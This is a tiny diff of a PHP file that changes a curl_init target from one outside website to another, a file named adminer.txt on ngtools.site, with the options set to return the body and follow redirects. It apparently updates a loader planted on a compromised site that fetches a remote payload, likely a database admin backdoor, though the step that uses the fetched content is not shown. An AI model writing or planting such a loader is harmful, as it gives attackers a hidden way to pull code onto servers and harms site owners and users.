@@ -1,5 +1,5 @@
 <?php
-$ch = curl_init("https://childrenofiran.org/landing/jurnal.senirupaikj/");
+$ch = curl_init("https://ngtools.site/ibs/adminer.txt");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 
